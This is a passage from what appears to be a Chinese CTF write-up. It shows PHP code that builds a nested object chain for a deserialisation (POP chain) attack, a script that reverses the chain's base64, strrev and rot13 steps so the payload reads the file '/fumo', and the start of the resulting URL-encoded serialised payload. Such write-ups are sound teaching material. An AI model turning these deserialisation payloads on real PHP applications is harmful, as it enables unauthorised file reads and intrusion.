            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">XbW5o6yiGv</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ezlgUUHCdQ</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">XEH9BQ</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ezlgUUHCdQ</span>{
        <span style="color:#66d9ef">public</span> $fDViVU;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fDViVU</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">p6NArTi</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">p6NArTi</span>{
        <span style="color:#66d9ef">public</span> $VbpsE7wqUH;
    <span style="color:#66d9ef">public</span> $yKwNrpRAQ;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">VbpsE7wqUH</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">xT506K</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">yKwNrpRAQ</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">xT506K</span>{
        <span style="color:#66d9ef">public</span> $Dblxvn;
    <span style="color:#66d9ef">public</span> $sPEbogX4;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Dblxvn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">u1q3m04qZb</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sPEbogX4</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">u1q3m04qZb</span>{
        <span style="color:#66d9ef">public</span> $NGIlAGGLv;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">NGIlAGGLv</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">c76So3oF</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">c76So3oF</span>{
        <span style="color:#66d9ef">public</span> $cwQWOIEL;
    <span style="color:#66d9ef">public</span> $rHYG3Wr;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cwQWOIEL</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">eHSt3I5L30</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rHYG3Wr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">eHSt3I5L30</span>{
        <span style="color:#66d9ef">public</span> $exoEH1;
    <span style="color:#66d9ef">public</span> $UO4yLd;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">exoEH1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FK0LfIlrxm</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">UO4yLd</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FK0LfIlrxm</span>{
        <span style="color:#66d9ef">public</span> $gZ9IzdbF6T;
    <span style="color:#66d9ef">public</span> $Q7mg44bg;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gZ9IzdbF6T</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">o5d0ioNZ</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Q7mg44bg</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">o5d0ioNZ</span>{
        <span style="color:#66d9ef">public</span> $exGoDOPm;
    <span style="color:#66d9ef">public</span> $TEODq2c3Uo;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">exGoDOPm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SKVnfvfbas</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">TEODq2c3Uo</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SKVnfvfbas</span>{
        <span style="color:#66d9ef">public</span> $UOvWbl;
    <span style="color:#66d9ef">public</span> $m4pnFndZoX;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">UOvWbl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">T6Y5QYS</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">m4pnFndZoX</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">T6Y5QYS</span>{
        <span style="color:#66d9ef">public</span> $p9mwE7l;
    <span style="color:#66d9ef">public</span> $aysl2yR5g;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p9mwE7l</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Ronyv7u</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">aysl2yR5g</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Ronyv7u</span>{
        <span style="color:#66d9ef">public</span> $uDQ0ehd4p;
    <span style="color:#66d9ef">public</span> $uqkULP0XD;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uDQ0ehd4p</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">d9vgRnlEA</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uqkULP0XD</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">d9vgRnlEA</span>{
        <span style="color:#66d9ef">public</span> $T4rUU9R;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">T4rUU9R</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Xl5V1fEbzD</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Xl5V1fEbzD</span>{
        <span style="color:#66d9ef">public</span> $fgVgm4TV97;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fgVgm4TV97</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">xEFW8yw08</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">xEFW8yw08</span>{
        <span style="color:#66d9ef">public</span> $nYuAuh2;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nYuAuh2</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Ugh4SYk00D</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Ugh4SYk00D</span>{
        <span style="color:#66d9ef">public</span> $tQF7ER;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tQF7ER</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">AN9pNsmlT</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AN9pNsmlT</span>{
        <span style="color:#66d9ef">public</span> $Ipz7D3;
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Ipz7D3</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
    }
    }
    
<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">amg2Vw</span>()));}
</code></pre></div><p>同时对pop链中的所有编码过程进行逆向，得到最终要进行读 <code>/fumo</code> 的编码结果：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
$fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;popchain.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
$payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/fumo&#39;</span>;
$line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($fp);
$list <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span> <span style="color:#a6e22e">feof</span>($fp)) {
    $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">fgets</span>($fp);<span style="color:#75715e">//fgets()函数从文件指针中读取一行
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">array_push</span>($list, <span style="color:#a6e22e">trim</span>($line));
    $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34; &#34;</span>,$line)[<span style="color:#ae81ff">3</span>]);
    <span style="color:#66d9ef">echo</span> $line<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;pass&#34;</span>) {
        <span style="color:#66d9ef">continue</span>;
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;base64_decode&#34;</span>) {
        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>($payload);
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ucfirst&#34;</span>) {
        <span style="color:#66d9ef">continue</span>;
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;strrev&#34;</span>) {
        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">strrev</span>($payload);
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;str_rot13&#34;</span>) {
        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_rot13</span>($payload);
    }
}
<span style="color:#66d9ef">echo</span> $payload<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
$list <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_reverse</span>($list);
<span style="color:#66d9ef">foreach</span>($list <span style="color:#66d9ef">as</span> $line){
    $line <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34; &#34;</span>,$line)[<span style="color:#ae81ff">3</span>];
    <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;pass&#34;</span>) {
        <span style="color:#66d9ef">continue</span>;
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;base64_decode&#34;</span>) {
        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($payload);
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ucfirst&#34;</span>) {
        <span style="color:#66d9ef">continue</span>;
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;strrev&#34;</span>) {
        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">strrev</span>($payload);
    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($line <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;str_rot13&#34;</span>) {
        $payload <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_rot13</span>($payload);
    }
}
<span style="color:#66d9ef">echo</span> $payload;
<span style="color:#a6e22e">fclose</span>($fp);
</code></pre></div><p>最终序列化链：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">O</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">Camg2Vw</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">PCR49GlRM</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CvS1qenzGWr</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">yrVWMn9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CGGcIkQ6E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">CK5OgoyC</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CuGnuU5pGgQ</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">XbW5o6yiGv</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CezlgUUHCdQ</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">fDViVU</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A21</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">Cp6NArTi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">VbpsE7wqUH</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CxT506K</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Dblxvn</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">Cu1q3m04qZb</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">NGIlAGGLv</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">Cc76So3oF</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">cwQWOIEL</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CeHSt3I5L30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">exoEH1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CFK0LfIlrxm</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">gZ9IzdbF6T</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">Co5d0ioNZ</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A8</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">exGoDOPm</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">christmasTree</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CSKVnfvfbas</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span 